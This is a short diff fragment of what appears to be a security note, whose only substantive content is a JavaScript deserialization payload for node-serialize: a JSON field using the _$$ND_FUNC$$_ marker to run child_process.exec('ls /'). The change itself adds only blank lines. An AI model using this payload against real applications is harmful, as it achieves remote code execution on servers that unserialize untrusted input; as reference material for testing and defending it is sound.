@@ -14,3 +14,5 @@ updated_at: '2023-04-06T03:55:59.262214+00:00'
 ```js
 {"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('ls /', function(error,stdout, stderr) { console.log(stdout) });}()"}
 ```
+
+
